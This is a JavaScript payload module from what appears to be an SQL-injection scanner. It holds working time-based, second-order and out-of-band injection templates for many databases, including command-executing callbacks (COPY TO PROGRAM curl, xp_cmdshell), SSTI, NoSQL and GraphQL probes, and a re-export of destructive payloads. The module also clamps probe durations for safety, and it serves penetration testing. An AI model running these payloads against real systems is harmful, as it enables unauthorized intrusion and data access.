// {SLEEP} 用短时长（秒）以降低探测成本；SQLite 无原生 sleep，用 LIKE(大块 HEX(RANDOMBLOB)) 重运算近似延迟（与 sqlmap 同思路）。
// 顺序即优先级（高频库在前，命中即停，避免请求爆炸）。
//
// [CTX-FIX 2026-09-18] 每条向量都必须带 `{BD}`（= 该注入点已探到的闭合前缀），模板里**不再写死引号**。
// 原实现的引号是逐条硬编码的：MySQL/PG/Oracle/SQLite 不带引号（只适用于数值上下文），
// ClickHouse/Sybase/H2/MonetDB 带 `'`（只适用于字符串上下文）—— 于是向量顺序在非数值上下文上被打乱：
// 真 MySQL 的字符串点上，MySQL 向量整条落进 `'%...%'` 字面量内 → 不延时 → 继续往下；
// 第 6 位的 ClickHouse 向量靠自带的 `'` 闭合成功 → MySQL 真的睡了 1 秒 → **定库 ClickHouse**。
// 后果不是"报告里写错一个词"：payload 族、注释符、报错模板、提取语句全部按错方言选。
// 实测（blackbox-lab 真 MySQL 8.0.28，2026-09-18）A2-string / A3-like 均判成 ClickHouse，
// 且 A3-like 唯一技术位是 time —— 它正是蹭这次误判才命中的。
export const TIME_VECTORS = [
  { dbms: 'MySQL', payload: '{ORIG}{BD} AND SLEEP({SLEEP})-- -' },
  { dbms: 'PostgreSQL', payload: '{ORIG}{BD} AND pg_sleep({SLEEP})-- -' },
  { dbms: 'SQL Server', payload: "{ORIG}{BD}; WAITFOR DELAY '0:0:{SLEEP}'-- -" },
  { dbms: 'Oracle', payload: "{ORIG}{BD} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -" },
  // [P1 批次 2026-09-08] SQLite 向量夹上限：RANDOMBLOB 上限 5MB（原 {SLEEP} 线性放大在
  // {SLEEP}=3+ 时达 15MB+，低端目标 CPU 重运算可 >10s 熔断超时）。MIN 夹顶不降基准：
  // {SLEEP}=1（指纹默认）仍为 5MB 与历史一致，零检出回归。超时由 sendInjection 的
  // timeoutMs 天然熔断（失败返回 null → 跳过该向量）。
  { dbms: 'SQLite', payload: "{ORIG}{BD} AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(MIN(({SLEEP}*5000000),5000000)))))-- -" },
  // [⑯] 补全时间向量：ClickHouse sleep() + Sybase WAITFOR DELAY（语句级，需堆叠分号）
  { dbms: 'ClickHouse', payload: '{ORIG}{BD} AND sleep({SLEEP})=0-- -' },
  { dbms: 'Sybase', payload: "{ORIG}{BD}; WAITFOR DELAY '0:0:{SLEEP}'-- -" },
  // [P1] MonetDB sys.sleep(sec)
  { dbms: 'MonetDB', payload: "{ORIG}{BD} AND (CASE WHEN 1=1 THEN sys.sleep({SLEEP}) ELSE 0 END) IS NOT NULL-- -" },
  // [UNIT-TRAP 2026-09-18] **H2 不放进盲探时间向量**（原条目 `{ORIG} AND SLEEP({SLEEP}000)=0` 已删）。
  // 理由不是命中率，是「我们会对客户的库做什么」：H2 的 SLEEP 以**毫秒**计、MySQL 的同名函数以
  // **秒**计，同一条 SQL 在两边差 1000 倍。给 `{BD}` 之后这条在数值上下文的 MySQL 上完全合法，
  // 一旦排在前面的 MySQL 向量因故没延时（例如 WAF 正好拦了 `SLEEP(1)` 而没拦 `SLEEP(1000)=0`），
  // 就是让目标库**睡 1000~15000 秒**——客户端连接池被我们自己占死，属于事故级自伤。
  // 单位不对称无法用任何表达式同时满足两边，因此 H2 定库改由**报错签名**承担
  // （`org.h2.jdbc` / "Syntax error in SQL statement" 已在 ERROR_SIG_BY_DBMS；
  // 真 JDBC H2 的验证见 e2e/multi-engine-lab）。
];

// 跨库通用"存储探针"（未知 dbms 时回退；已知 dbms 优先用 PAYLOADS[dbms].error）。
// 均为报错型、非破坏性语句（不 DROP / 不写文件 / 不 LOAD_FILE），仅触发数据库报错回显以判定二阶注入。
export const SECOND_ORDER_PROBES = [
  "'",
  "' AND '1'='1",
  "') OR ('1'='1",
  "';-- -",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
];

// 二阶注入 OOB 触发探针（存储值被读出后重新拼入查询，触发数据库带外回连以确认"无回显二阶注入"）。
// 占位符：{ORIG}=存储点原始值；{CALLBACK}=带外回调地址（callbackBase/oob/:token）。
// 与一阶 OOB_PAYLOADS 区别：二阶探针需"闭合字符串上下文后追加带外语句"（存储值会被拼进
// 目标后续读出的 SQL，如 WHERE col='{stored}'），故每条均以闭合引号开头、-- - 注释结尾。
// 无可靠 OOB 原语的库（SQLite/ClickHouse/DB2/Sybase/Firebird/Informix/H2）留空，检测器回退跳过。
export const SECOND_ORDER_OOB_PROBES = {
  MySQL: [
    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
  ],
  MariaDB: [
    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
  ],
  PostgreSQL: [
    "{ORIG}'; COPY (SELECT '') TO PROGRAM 'curl {CALLBACK}'-- -",
    "{ORIG}'; COPY (SELECT 1) TO PROGRAM 'nslookup {CALLBACK}'-- -",
  ],
  'SQL Server': [
    "{ORIG}'; EXEC master..xp_dirtree '\\\\{CALLBACK}'-- -",
    "{ORIG}'; EXEC master..xp_cmdshell 'ping -n 1 {CALLBACK}'-- -",
  ],
  Oracle: [
    "{ORIG}' AND 1=1; SELECT UTL_HTTP.REQUEST('http://{CALLBACK}') FROM dual-- -",
    "{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT '{CALLBACK}'))) IS NULL-- -",
  ],
  // TiDB：MySQL 协议兼容，复用 MySQL 二阶 OOB 模板（UNC/LOAD_FILE 回连）
  TiDB: [
    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
  ],
  // DM8：Oracle 兼容模式，复用 Oracle 二阶 OOB 模板（UTL_HTTP 回连，需对应权限）
  DM8: [
    "{ORIG}' AND 1=1; SELECT UTL_HTTP.REQUEST('http://{CALLBACK}') FROM dual-- -",
    "{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT '{CALLBACK}'))) IS NULL-- -",
  ],
  // 以下库无可靠 OOB 原语，留空不投放
  SQLite: [],
  ClickHouse: [],
  DB2: [],
  Sybase: [],
  Firebird: [],
  Informix: [],
  H2: [],
};

// ==================== 非 SQL 注入探测表（NoSQL / SSTI / GraphQL） ====================
// 供 NoSqlInjectionDetector 消费；与经典 PAYLOADS 解耦，不污染 SQLi 流水线。
// 探测表均按成本/常见度升序排列，检测器命中即停，避免请求爆炸。

// MongoDB 操作符注入矩阵：按探测成本升序（$gt/$ne 最廉价，命中即停；未命中再试 $where/$regex 等）。
// 每条含 primary（首次探测）与 confirm（二次确认，等价但取值不同，降低单次抖动误报）。
// true=恒真倾向（匹配更多文档）/ false=恒假倾向（匹配更少文档），二者响应差异即注入特征。
// {ORIG} 由检测器拼接成闭合上下文的注入串（JSON body 与 URL 参数两种入口均兼容）。
export const NOSQL_OPERATOR_PROBES = [
  { name: '$gt/$ne', cost: 1, primary: { true: '{"$gt": ""}', false: '{"$ne": ""}' }, confirm: { true: '{"$gt": "0"}', false: '{"$ne": "0"}' } },
  { name: '$where', cost: 2, primary: { true: '{"$where": "1"}', false: '{"$where": "0"}' }, confirm: { true: '{"$where": "1==1"}', false: '{"$where": "1==2"}' } },
  { name: '$regex', cost: 2, primary: { true: '{"$regex": ".*"}', false: '{"$regex": "a^"}' }, confirm: { true: '{"$regex": "^.*$"}', false: '{"$regex": "(?!)"}' } },
  { name: '$in/$nin', cost: 2, primary: { true: '{"$nin": ["sqli_probe_nope_0"]}', false: '{"$in": ["sqli_probe_nope_0"]}' }, confirm: { true: '{"$nin": ["sqli_probe_nope_1"]}', false: '{"$in": ["sqli_probe_nope_1"]}' } },
  { name: '$exists', cost: 2, primary: { true: '{"$exists": true}', false: '{"$exists": false}' }, confirm: { true: '{"$exists": 1}', false: '{"$exists": 0}' } },
  { name: '$type', cost: 2, primary: { true: '{"$type": 2}', false: '{"$type": 16}' }, confirm: { true: '{"$type": "string"}', false: '{"$type": "int"}' } },
];

// SSTI 多引擎探测表：表达式被求值（回显 49 / config 等特征）即命中，命中即停。
// sig 为求值回显特征（表达式本身不出现于基线响应时才判命中，剔除「原样回显未求值」）。
export const SSTI_PROBES = [
  { engine: 'Jinja2/Twig', expr: '{{7*7}}', sig: /49/ },
  { engine: 'Jinja2/Twig', expr: '{{config}}', sig: /Config|SECRET_KEY/i },
  { engine: 'Jinja2/Twig', expr: "{{''.__class__.__mro__[1].__subclasses__()}}", sig: /__subclasses__|<class|subprocess/i },
  { engine: 'FreeMarker', expr: '${7*7}', sig: /49/ },
  { engine: 'Velocity', expr: '#set($x=7*7)${x}', sig: /49/ },
  { engine: 'ERB', expr: '<%= 7*7 %>', sig: /49/ },
  { engine: 'Thymeleaf', expr: '*{7*7}', sig: /49/ },
  { engine: '通用', expr: '${7*7}', sig: /49/ },
];

// GraphQL 注入探测表：只读查询（不写、不执行命令、不改数据），按探测深度升序，命中即停。
// ① 内省 ② 字段别名 ③ 批处理（JSON 数组批量 query + 别名冲突）④ 循环查询（introspection 深度）。
export const GRAPHQL_PROBES = [
  { name: '内省', query: 'query { __schema { queryType { name } } }', sig: /__schema|queryType/ },
  { name: '字段别名', query: 'query { alias_probe: __typename }', sig: /__typename|alias_probe/ },
  { name: '批处理', query: '[{"query":"query { __typename }"},{"query":"query { q1: __typename q2: __typename }"}]', sig: /__typename|__schema/ },
  { name: '循环查询', query: 'query { __schema { types { name fields { name } } } }', sig: /__schema|types/ },
];

// 生成 N 个 NULL 占位（UNION SELECT 中非回显列填空，回显列由 WRAP 包裹结果替换）
// 非正数时至少返回 1 个 NULL，避免生成空序列导致 UNION 列数错配。
export function nullSequence(columns) {
  const n = Number.isFinite(columns) && columns > 0 ? columns : 1;
  return Array.from({ length: n }, () => 'NULL').join(',');
}

/**
 * [P0-FIX 2026-09-09] 时间/重运算向量的安全上界。
 *
 * 为什么在渲染层收口而不是逐条改模板：全项目有 20+ 个带 {SLEEP} 的向量（TIME_VECTORS、
 * 各库 time 池、注册表里的 BENCHMARK 变体），逐条改必然漏，漏一条就等于没做。
 *
 * 实战后果：
 *   · `--time-sec 60` 会让目标库每个探针睡 60 秒，乘上采样次数与并发，相当于把客户库的
 *     连接池占死几分钟（在共享实例上这就是一次我们自造成的可用性问题）；
 *   · MySQL 的 `BENCHMARK({SLEEP}0000000, MD5(1))` 是**字符串拼接**：sleep=60 → 六千万次 MD5。
 *
 * 上界取值的保守原则：**今天默认配置的产物不得变化**（sleep=1 指纹、sleep=2 检测），
 * 只拦「用户显式调大后的失控值」。要真的压低默认开销，应单独开一批并用 e2e 验证后再改。
 */
export const TIME_SLEEP_MIN_SEC = 1;
export const TIME_SLEEP_MAX_SEC = 15;
/** BENCHMARK 迭代上限：等于 sleep=2（历史默认）拼出的 20000000，因此默认路径零变化 */
export const BENCHMARK_MAX_ITER = 20_000_000;
/** RANDOMBLOB 字节上限：与 SQLite 模板里的 MIN(...,5000000) 保持一致（此处只兵头） */
export const RANDOMBLOB_MAX_BYTES = 5_000_000;

/**
 * 夹顶时间变量：非法/缺失保持历史默认（1 秒），区间外贴边。
 * @param {{sleep?: number|string, bd?: string}} [vars]
 * @returns {{orig?: string, sleep: number, num?: number, sep?: string, bd?: string}} 浅拷贝后的变量集
 *   （函数体用 { ...vars } 透传其余字段，故返回类型须含 orig/num/sep/bd，否则调用方取值会被判不存在。
 *   这里漏列过 `bd` → `tsc -p server/tsconfig.json` 报 TS2339，而本地 `npm run typecheck` 只覆盖
 *   前端，所以它一路进了提交；服务端类型检查在 CI 里是独立一步，而 CI 从未真正执行过。）
 */
export function clampTimeVars(vars = {}) {
  const raw = Number(vars?.sleep);
  if (!Number.isFinite(raw)) {
    // 未提供或非数值：保持旧语义（?? 1），绝不把 NaN 拼进 payload（会渲染出 `SLEEP(NaN)`）
    return { ...(vars || {}), sleep: 1 };
  }
  const clamped = Math.min(Math.max(raw, TIME_SLEEP_MIN_SEC), TIME_SLEEP_MAX_SEC);
  if (clamped !== raw) {
    logger.debug(
      `时间向量 sleep 已从 ${raw}s 夹到 ${clamped}s（允许区间 ${TIME_SLEEP_MIN_SEC}~${TIME_SLEEP_MAX_SEC}s）：` +
        '避免对目标库造成分钟级挂住。确需更长延迟请同步调高 TIME_SLEEP_MAX_SEC，并确认可承担影响。'
    );
  }
  return { ...vars, sleep: clamped };
}

/**
 * 对渲染结果里的重运算函数做迭代数/字节数封顶（幂等：已在上限内的值原样返回）。
 * @param {string} filled 已填充的 payload
 * @returns {string}
 */
export function capHeavyFunctions(filled) {
  return String(filled)
    .replace(/BENCHMARK\(\s*(\d+)/gi, (m, digits) => `BENCHMARK(${Math.min(Number(digits), BENCHMARK_MAX_ITER)}`)
    .replace(/RANDOMBLOB\(\s*(\d+)/gi, (m, digits) => `RANDOMBLOB(${Math.min(Number(digits), RANDOMBLOB_MAX_BYTES)}`);
}

/**
 * 填充 payload 模板中的占位符
 * @param {string} template 含占位符的模板
 * @param {{orig?: string, sleep?: number, num?: number, sep?: string, bd?: string}} vars 占位符值
 *   `bd` = 该注入点的闭合前缀（boundary），供需要跨上下文使用的向量（见 TIME_VECTORS）拼接
 * @returns {string} 填充后的 payload
 */
export function fillPayload(template, vars = {}) {
  const v = clampTimeVars(vars);
  return capHeavyFunctions(
    template
      .replaceAll('{ORIG}', v.orig ?? '')
      .replaceAll('{BD}', v.bd ?? '')
      .replaceAll('{SLEEP}', String(v.sleep ?? 1))
      .replaceAll('{NUM}', String(v.num ?? Math.floor(Math.random() * 9000) + 1000))
      .replaceAll('{SEP}', v.sep ?? '-- -')
  );
}

/**
 * WAF 规避混淆（仅将 AND/OR 关键词包裹注释，不改变语义）
 * 已下沉至 core/tamper/obfuscate.js（P1-A2 消除 core→engine 反向依赖），
 * 此处 re-export 保持向后兼容（Detector/injection/Extractor/测试仍从 payloads 导入）。
 */
export { obfuscatePayload } from '../../core/tamper/obfuscate.js';

/**
 * 生成某 DBMS + 技术 的全部 payload（已填充占位符）
 * @param {string} dbms
 * @param {string} technique
 * @param {object} vars
 * @returns {string[]}
 */
export function buildPayloads(dbms, technique, vars = {}) {
  const list = (PAYLOADS[dbms] && PAYLOADS[dbms][technique]) || [];
  return list.map((t) => fillPayload(t, vars));
}

/**
 * 取某 DBMS + 技术 的原始模板列表（未填充占位符）
 * @param {string} dbms
 * @param {string} technique
 * @returns {string[]}
 */
export function getPayloadGroup(dbms, technique) {
  return (PAYLOADS[dbms] && PAYLOADS[dbms][technique]) || [];
}

// ==================== 子句位置变体消费 helper（对标 sqlmap clause 属性筛选） ====================
// 检测器约定：主模板未命中且 config.level >= 2 时才调用（level=1 完全不消费，请求数零变化）；
// 有界：maxPerClause 限制单 clause 单技术条数、maxTotal 限制单库单技术总量。

/**
 * 取某 DBMS + 技术 的子句位置模板（带 clause 元数据，未填充占位符）
 * @param {string} dbms
 * @param {string} technique error / time（boolean 走 getClausePairs 真假对）
 * @param {{maxPerClause?: number, maxTotal?: number}} opts 有界截断（默认 3 / 8）
 * @returns {{clause: string, tpl: string}[]}
 */
export function getClauseTemplates(dbms, technique, { maxPerClause = 3, maxTotal = 8 } = {}) {
  const out = [];
  const group = CLAUSE_PAYLOADS[dbms];
  if (!group) return out;
  for (const [clause, techs] of Object.entries(group)) {
    const list = techs && techs[technique];
    if (!Array.isArray(list) || list.length === 0) continue;
    // 仅取字符串单模板（error/time）；boolean 在结构中为真假对（数组），走 getClausePairs 消费
    for (const tpl of list.filter((x) => typeof x === 'string').slice(0, maxPerClause)) {
      if (out.length >= maxTotal) return out;
      out.push({ clause, tpl });
    }
  }
  return out;
}

/**
 * 取某 DBMS + 技术 的子句位置模板（已填充占位符，带 clause 元数据）
 * @param {string} dbms
 * @param {string} technique
 * @param {object} vars fillPayload 变量（orig/sleep/num/sep）
 * @param {{maxPerClause?: number, maxTotal?: number}} opts
 * @returns {{clause: string, payload: string}[]}
 */
export function buildClausePayloads(dbms, technique, vars = {}, opts = {}) {
  return getClauseTemplates(dbms, technique, opts).map((t) => ({ clause: t.clause, payload: fillPayload(t.tpl, vars) }));
}

/**
 * 取某 DBMS 的子句位置布尔真假对（带 clause 元数据；含 where 括号闭合补充变体）
 * @param {string} dbms
 * @param {{maxTotal?: number}} opts 有界截断（默认 6 对）
 * @returns {{clause: string, trueTpl: string, falseTpl: string}[]}
 */
export function getClausePairs(dbms, { maxTotal = 6 } = {}) {
  const out = [];
  const group = CLAUSE_PAYLOADS[dbms];
  if (!group) return out;
  for (const [clause, techs] of Object.entries(group)) {
    const pairs = techs && techs.boolean;
    if (!Array.isArray(pairs)) continue;
    for (const pair of pairs) {
      if (out.length >= maxTotal) return out;
      if (Array.isArray(pair) && pair.length === 2 && pair[0] && pair[1]) {
        out.push({ clause, trueTpl: pair[0], falseTpl: pair[1] });
      }
    }
  }
  return out;
}

/**
 * 取某 DBMS 的子句位置布尔真假对（已填充占位符，带 clause 元数据）
 * @param {string} dbms
 * @param {object} vars fillPayload 变量
 * @param {{maxTotal?: number}} opts
 * @returns {{clause: string, truePayload: string, falsePayload: string}[]}
 */
export function buildClausePairs(dbms, vars = {}, opts = {}) {
  return getClausePairs(dbms, opts).map((p) => ({
    clause: p.clause,
    truePayload: fillPayload(p.trueTpl, vars),
    falsePayload: fillPayload(p.falseTpl, vars),
  }));
}

// ==================== 高危 payload 池再导出 ====================
// 调用方（CLI --risk=3 / REST 显式确认）可按需启用；默认路径不消费，零回归。
export {
  DESTRUCTIVE_PAYLOADS,
  DESTRUCTIVE_MIN_RISK,
  enableDestructivePayloads,
  getDestructiveTemplates,
};
